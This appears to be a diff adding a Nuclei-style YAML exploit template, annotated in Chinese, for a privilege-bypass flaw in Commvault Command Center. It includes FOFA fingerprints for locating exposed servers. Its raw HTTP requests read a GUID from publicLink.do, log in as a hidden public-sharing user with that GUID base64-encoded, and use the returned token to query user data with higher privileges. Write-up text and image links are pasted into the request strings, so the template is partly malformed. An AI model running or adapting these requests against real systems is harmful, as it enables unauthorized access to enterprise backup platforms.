@@ -1,0 +1,54 @@
+id: poc-yyie6n962p0zms6z
+info:
+  name: Commvault存在权限绕过漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yyie6n962p0zms6z'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yyie6n962p0zms6z
+    fofa: 'banner="Server: Commvault" || header="Server: Commvault" || body="cvUtil.CONTEXT_PATH = ''/webconsole''" || title="Command Center" || (body="url=commandcenter" && title=="Redirecting..")'
+http:
+- raw:
+  - 'GET /commandcenter/publicLink.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    取出cv-gorkha，这里的值为GUID
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547102139-30ebeb61-1c54-498d-9e56-a405b0e4ca48.png)
+
+
+    Step2 使用默认账号登录
+
+    Password中的值为step1取出的cv-gorkha的值并进行了base64编码'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "POST /commandcenter/api/Login HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nContent-Type: application/json;charset=UTF-8\nContent-Length: 117\n\n{\n  \"username\": \"_+_PublicSharingUser_\",\n  \"password\": \"QjY5NzI1QjEtNTRDOS00NkM3LUFBNEMtRDhDQjRFMThERDg5\"\n}\n\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547102419-8212de6d-a175-420e-a9af-5d5b0eaba4ea.png)\n此时回显的便为token，此时token为低权限数据权限\n\nStep3 提权\nAuthtoken为step2返回值"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /commandcenter/RestServlet/Database/GetUmUserById/1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/xml
+
+    Authtoken: QSDK 3ce4460b10eb59af4c6db51bd02caf897deb8ec229277d62336db2bf6f5a3a8582112e314165be5bf6ce9eeb5d990302375ac4c6dd2a09685b1cf29b3441d9b47cf0fe59cc0275eb9e741bcc7e08256483201d6ae4a58268a6a3aed4e47e44b5db7cbf0cced7579a3aaf23de66ab78ea21fdba68378247ab666c792b054377ea52ce7f5bd82b7f6f8109d09a7b60cadda98ee56fd37c80d897bb3e7e5587112fab9eb3f5e4ba8b6ec9404cd777ea40d86b32f86559037f0e3b6530ed981ba36c7ff65a406f28e5130c59c21eaa66c46cf85ece067090d3373
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547102649-18c63eba-6336-407e-bdd6-b7a53c4aa230.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
